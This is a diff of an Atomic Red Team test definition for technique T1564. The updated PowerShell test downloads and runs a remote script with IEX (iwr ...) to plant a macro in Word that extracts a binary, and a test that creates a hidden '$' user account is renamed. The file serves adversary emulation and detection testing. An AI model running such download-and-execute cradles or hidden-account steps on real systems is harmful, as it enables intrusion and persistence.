@@ -33,12 +33,13 @@ atomic_tests:
     command: |
       $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
       $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
     cleanup_command: |
       Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
     name: powershell
-- name: Create a user called "$" as noted here
+- name: Create a Hidden User Called "$"
   auto_generated_guid: 2ec63cc2-4975-41a6-bf09-dffdfb610778
   description: Creating a user with a username containing "$" 
   supported_platforms:
